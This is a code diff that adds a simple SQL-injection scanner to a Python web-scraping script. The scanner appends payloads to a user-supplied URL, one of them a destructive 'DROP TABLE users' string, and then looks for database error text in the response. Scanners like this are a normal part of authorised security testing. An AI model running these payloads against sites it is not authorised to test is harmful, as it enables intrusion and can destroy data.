@@ -70,3 +70,17 @@ def scrape_website():
     
     for a_tag in soup.find_all('a', href=True):
         print(f"Title: {a_tag.get_text().strip()}, Link: {a_tag['href']}")
+        
+
+def scan_sql_injection():
+    url = input("[+] Enter the target URL: ")
+    payloads = ["'" , "1' OR '1'='1", "1'; DROP TABLE users; --"]
+    
+    for payload in payloads:
+        test_url = f"{url}{payload}"
+        response = requests.get(test_url)
+        
+        if any(keyword in response.text for keyword in ['SQL syntax', 'mysql', 'error']):
+            print(f"[+] Vulnerable to SQL Injection: {test_url}")
+            
+
